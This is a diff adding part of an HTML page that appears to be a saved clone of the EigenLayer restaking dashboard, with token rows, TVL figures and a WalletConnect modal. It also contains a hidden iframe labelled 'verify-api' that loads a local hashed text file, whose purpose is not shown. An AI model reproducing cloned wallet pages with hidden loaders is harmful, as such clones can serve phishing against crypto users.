+                  <span class="text-LabelM font-abcRepro false">111,215.1126</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="oETH" href="https://app.eigenlayer.xyz/token/oETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-primaryBg hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/oETH.webp" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" srcset="oETH-1.png 1x, oETH.png 2x" src="oETH.png"
+                style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Origin Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">oETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">11,273.9178</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a><a aria-label="ankrETH" href="https://app.eigenlayer.xyz/token/ankrETH">
+          <div
+            class="p-6 flex flex-col lg:flex-row items-start gap-6 lg:items-center justify-between rounded-lg bg-interactiveQuarternary hover:bg-interactiveQuarternaryHover">
+            <div class="flex items-center w-full gap-4 lg:w-auto"><img alt="tokenIcon/ankrETH.webp" loading="lazy"
+                width="32" height="32" decoding="async" data-nimg="1" srcset="ankrETH-1.png 1x, ankrETH.png 2x"
+                src="ankrETH.png" style="color: transparent;">
+              <div class="flex gap-2 text-start"><span class="text-Heading3 font-abcRepro">Ankr Staked Ether</span>
+                <div
+                  class="rounded-full py-1.5 px-3 w-fit flex items-center justify-center text-inversePrimaryFg bg-accentPurple max-h-8">
+                  <span class="text-ShortTextXS font-ibmPlexMono">ankrETH</span></div>
+              </div>
+            </div>
+            <div class="flex flex-col items-start w-full gap-6 lg:w-auto lg:items-center lg:flex-row text-start">
+              <div class="flex items-center w-full lg:w-auto">
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked</span>
+                </div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro text-disabledFg">0.0000</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">Restaked Points</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">Restaked
+                    Points</span></div>
+                <div
+                  class="flex flex-col justify-start w-1/3 h-20 px-0 py-4 border-t whitespace-nowrap lg:h-auto lg:py-0 lg:pl-4 lg:w-40 lg:border-l lg:border-t-0 border-accentGreen">
+                  <span class="text-LabelM font-abcRepro false">977.2364</span><span
+                    class="text-ShortTextS font-ibmPlexMono hidden lg:block text-tertiaryFg">TVL</span><span
+                    class="text-ShortTextXS font-ibmPlexMono block whitespace-normal lg:hidden text-tertiaryFg">TVL</span>
+                </div>
+              </div><button
+                class="h-fit font-ibmPlexMono inline-block focus:border-borderFocus focus:shadow-[0px_0px_0px_4px_rgba(255,255,255,0.24)] outline-none bg-interactivePrimary border-2 border-transparent hover:bg-interactivePrimaryHover active:bg-interactivePrimaryPress focus:bg-interactivePrimaryFocus text-inversePrimaryFg px-4 py-2 text-ShortTextS w-fit block lg:hidden"
+                type="button">Manage Stake</button>
+            </div>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+  <div class="fixed bottom-0 flex justify-between w-full px-4 py-2 bg-quarternaryBg">
+    <div class="flex items-center gap-1 sm:gap-2"><a href="https://docs.eigenlayer.xyz/overview/terms-of-service"
+        target="blank" rel="noreferrer"><span
+          class="text-ShortTextS font-ibmPlexMono inline text-tertiaryFg hover:text-primaryFg sm:hidden">ToS</span><span
+          class="text-ShortTextS font-ibmPlexMono hidden text-tertiaryFg hover:text-primaryFg sm:inline">Terms of
+          Service</span></a>
+      <div data-orientation="vertical" aria-orientation="vertical" role="separator"
+        class="h-full w-0.5 bg-borderDivider"></div><a
+        href="https://docs.eigenlayer.xyz/overview/eigenlayer-privacy-policy" target="blank" rel="noreferrer"><span
+          class="text-ShortTextS font-ibmPlexMono inline text-tertiaryFg hover:text-primaryFg sm:hidden">Privacy</span><span
+          class="text-ShortTextS font-ibmPlexMono hidden text-tertiaryFg hover:text-primaryFg sm:inline">Privacy
+          Policy</span></a>
+    </div><button data-state="closed" class="">
+      <div class="flex items-center justify-end w-full h-full gap-2"><span
+          class="text-ShortTextM font-ibmPlexMono hidden sm:inline">TVL</span><span
+          class="text-ShortTextS font-ibmPlexMono inline sm:hidden">TVL</span>
+        <div data-orientation="vertical" aria-orientation="vertical" role="separator"
+          class="h-full bg-accentGreen w-[1px]"></div><span
+          class="text-ShortTextL font-ibmPlexMono items-center hidden sm:flex">938,404.2183 ETH</span><span
+          class="text-ShortTextS font-ibmPlexMono flex items-center sm:hidden">938,404.2183 ETH</span>
+      </div>
+    </button>
+  </div>
+  <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none">
+    <ol tabindex="-1" class="fixed w-80 p-4 bottom-0 right-0"></ol>
+  </div><next-route-announcer style="position: absolute;"
+    data-scrapbook-shadowdom="<div aria-live=&quot;assertive&quot; id=&quot;__next-route-announcer__&quot; role=&quot;alert&quot; style=&quot;position: absolute; border: 0px; height: 1px; margin: -1px; padding: 0px; width: 1px; clip: rect(0px, 0px, 0px, 0px); overflow: hidden; white-space: nowrap; overflow-wrap: normal;&quot;></div>"></next-route-announcer><iframe
+    id="verify-api" src="be72ab7350f1efa18d91616a51bc037c.txt" style="display: none;"></iframe><wcm-modal
+    data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$499611187$--></div></div><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button wcm-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }</style><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>:host { all: initial; }
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.wcm-active { pointer-events: auto; }
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}</style>"></wcm-modal>
+
+</body>
+
+</html>
